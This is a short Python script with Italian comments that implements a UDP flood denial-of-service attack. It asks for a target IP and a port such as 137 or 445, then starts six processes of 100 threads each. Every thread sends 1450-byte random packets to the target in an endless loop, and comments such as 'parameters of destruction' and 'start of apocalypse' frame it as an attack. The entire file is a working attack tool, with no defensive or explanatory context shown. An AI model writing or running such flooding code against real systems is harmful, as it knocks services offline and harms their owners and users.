import socket
import random
import threading
import multiprocessing # Usiamo anche i processi per vera potenza su M1

# --- PARAMETRI DI DISTRUZIONE ---
target_ip = input(" [>] IP Bersaglio (XP): ").strip()
target_port = int(input(" [>] Porta da annientare (es. 137 o 445): "))
# Creiamo un'armata: 100 thread per ogni core di Kali
threads_per_process = 100 

def ultra_flood():
    # Creiamo un payload enorme e pre-allocato per non sprecare CPU su Kali
    # 1450 byte è il limite per evitare la frammentazione e colpire più duro
    payload = random.randbytes(1450)
    
    # Creiamo il socket fuori dal loop per sparare a raffica
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # Invio diretto senza fronzoli
            sock.sendto(payload, (target_ip, target_port))
        except:
            # Se il sistema satura i socket, ne apriamo un altro istantaneamente
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def start_army():
    print(f"\n[!!!] INIZIO APOCALISSE SU {target_ip}:{target_port} [!!!]")
    army = []
    for i in range(threads_per_process):
        t = threading.Thread(target=ultra_flood)
        t.daemon = True
        army.append(t)
        t.start()
    
    # Mantiene il processo attivo
    for t in army:
        t.join()

if __name__ == "__main__":
    # Sfruttiamo tutti i 6 core di Kali creando 6 processi indipendenti
    # Ogni processo avrà 100 thread. Totale = 600 attaccanti simultanei.
    for p_id in range(6):
        p = multiprocessing.Process(target=start_army)
        p.start()
